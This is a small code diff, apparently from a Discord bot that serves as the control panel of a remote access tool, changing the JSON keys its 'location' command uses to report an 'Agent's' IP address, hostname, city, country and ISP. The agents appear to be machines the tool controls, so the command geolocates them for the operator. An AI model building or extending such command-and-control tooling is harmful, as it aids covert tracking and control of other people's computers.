@@ -289,10 +289,10 @@ async def location(ctx: commands.Context):
         response = ghostagent.location()
         if response != False:
             my_embed = discord.Embed(title=f"IP Based Location on Agent#{ID}", color=0x00FF00)
-            my_embed.add_field(name="IP:", value=f"**{response.json()['IP Address']}**", inline=False)
+            my_embed.add_field(name="IP:", value=f"**{response.json()['IP']}**", inline=False)
             my_embed.add_field(name="Hostname:", value=f"**{response.json()['Hostname']}**", inline=False)
             my_embed.add_field(name="City:", value=f"**{response.json()['Location']}**", inline=False)
-            my_embed.add_field(name="Country:", value=f"**{response.json()['Country Code']}**", inline=False)
+            my_embed.add_field(name="Country:", value=f"**{response.json()['CountryCode']}**", inline=False)
             my_embed.add_field(name="ISP:", value=f"**{response.json()['ISP']}**", inline=False)
         else:
             my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}", color=0xFF0000)
